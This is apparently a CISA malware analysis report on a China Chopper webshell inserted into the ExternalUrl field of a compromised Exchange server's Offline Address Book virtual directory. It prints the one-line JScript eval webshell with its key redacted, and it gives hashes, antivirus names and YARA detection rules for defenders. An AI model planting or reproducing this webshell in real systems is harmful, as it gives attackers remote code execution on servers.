Summary Description CISA received two files for analysis. These files appear to contain configuration data for two different Microsoft Exchange Offline Address Book (OAB) Virtual Directories (VD) extracted from a single Microsoft Exchange Server. Both output files show malicious modifications for the ExternalUrl parameters for these two OAB VDs on the targeted Exchange Servers. In one of the OAB VDs, the ExternalUrl parameter contains a "China Chopper" webshell which may permit a remote operator to dynamically execute JavaScript code on the compromised Microsoft Exchange Server. For a downloadable copy of IOCs, see: MAR-10328923-1.v1.stix .

Description This file is an OAB configuration file from a legitimate Set-OABVirtualDirectory cmdlet. This file is typically used to edit an OAB VD in Internet Information Services (IIS) on Microsoft Exchange servers. Analysis indicates this file contains log data collected from an OAB configured on a compromised Microsoft Exchange Server. The Exchange OAB VD is utilized to access Microsoft Exchange address lists. For this file, the OAB ExternalUrl parameter has been modified by a remote operator to include a "China Chopper" webshell which is likely an attempt to gain unauthorized access for dynamic remote code execution against a targeted Microsoft Exchange Server. In this file, the OAB ExternalUrl parameter was configured to accept JavaScript code which will directly be executed on the target system. The modification of the ExternalUrl parameter suggests the operator can dynamically submit queries to this Exchange OAB VD containing JavaScript code that will be executed on the target system. In this file, the ExternalUrl designation that normally specifies the Uniform Resource Locator (URL) used to connect to the VD from outside the firewall has been replaced with the following code: --Begin Code-- hxxp[:]//f/<script language="JScript" runat="server">function Page_Load(){eval(Request["[REDACTED]"],"unsafe");}</script> --End Code-- Note: The hard-coded key used for authentication was redacted from the code above. This code allows an attacker to access the shell using a password. Once accessed, the attacker is able to execute commands on the page with server (system) level privileges. 1e0803ffc283dd04279bf3351b92614325e643564ed5b4004985eb0486bf44ee Tags backdoor trojan webshell Details Name discover.aspx Size 2230 bytes Type HTML document, ASCII text, with CRLF line terminators MD5 ca7df873422d59c358397d3cb44ae6aa SHA1 f95be23d52cbaa24bde99cf33a9be55bca688972 SHA256 1e0803ffc283dd04279bf3351b92614325e643564ed5b4004985eb0486bf44ee SHA512 9e696ad26291e391cb29aff1845f78f0024f4808b10aa17cf7192f6f144378ea43b5533e3e0669cc19b07d88e00f4be39a95fa5500559573177b59585b7dad30 ssdeep 48:kNrdelW1BDc0oM5QZLhPYFzQ14ONF0q6q:ktdelWfXWYF0PNCq6q Entropy 4.657248 Antivirus Ahnlab Exploit/ASP.Cve-2021-27065.S1406 BitDefender Generic.ASP.WebShell.H.29944B27 ClamAV Asp.Trojan.Webshell0321-9840176-0 Emsisoft Generic.ASP.WebShell.H.29944B27 (B) Ikarus Exploit.ASP.CVE-2021-27065 Lavasoft Generic.ASP.WebShell.H.29944B27 McAfee Exploit-CVE2021-27065.a Microsoft Security Essentials Exploit:ASP/CVE-2021-27065 Quick Heal CVE-2021-26855.Webshll.41350 Sophos Troj/WebShel-L Symantec Trojan.Chinchop YARA Rules rule CISA_10328929_01 : trojan webshell exploit CVE_2021_27065 { meta: Author = "CISA Code & Media Analysis" Incident = "10328929" Date = "2021-03-17" Last_Modified = "20210317_2200" Actor = "n/a" Category = "Trojan WebShell Exploit CVE-2021-27065" Family = "HAFNIUM" Description = "Detects CVE-2021-27065 Webshellz" MD5_1 = "ab3963337cf24dc2ade6406f11901e1f" SHA256_1 = "c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5" strings: $s0 = { 65 76 61 6C 28 52 65 71 75 65 73 74 5B 22 [1-32] 5D 2C 22 75 6E 73 61 66 65 22 29 } $s1 = { 65 76 61 6C 28 } $s2 = { 28 52 65 71 75 65 73 74 2E 49 74 65 6D 5B [1-36] 5D 29 29 2C 22 75 6E 73 61 66 65 22 29 } $s3 = { 49 4F 2E 53 74 72 65 61 6D 57 72 69 74 65 72 28 52 65 71 75 65 73 74 2E 46 6F 72 6D 5B [1-24] 5D } $s4 = { 57 72 69 74 65 28 52 65 71 75 65 73 74 2E 46 6F 72 6D 5B [1-24] 5D } condition: $s0 or ($s1 and $s2) or ($s3 and $s4) } rule CISA_10328929_02 : trojan webshell exploit CVE_2021_27065 { meta: Author = "CISA Code & Media Analysis" Incident = "10328929" Date = "2021-03-17" Last_Modified = "20210317_2200" Actor = "n/a" Category = "Trojan WebShell Exploit CVE-2021-27065" Family = "HAFNIUM" Description = "Detects CVE-2021-27065 Exchange OAB VD MOD" MD5_1 = "ab3963337cf24dc2ade6406f11901e1f" SHA256_1 = "c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5" strings: $s0 = { 4F 66 66 6C 69 6E 65 41 64 64 72 65 73 73 42 6F 6F 6B 73 } $s1 = { 3A 20 68 74 74 70 3A 2F 2F [1] 2F } $s2 = { 45 78 74 65 72 6E 61 6C 55 72 6C 20 20 20 20 } condition: $s0 and $s1 and $s2 } ssdeep Matches No matches found.

Recommendations CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts. Maintain up-to-date antivirus signatures and engines. Keep operating system patches up-to-date. Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication. Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required. Enforce a strong password policy and implement regular password changes. Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known. Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests. Disable unnecessary services on agency workstations and servers. Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header). Monitor users' web browsing habits; restrict access to sites with unfavorable content. Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.). Scan all software downloaded from the Internet prior to executing. Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).
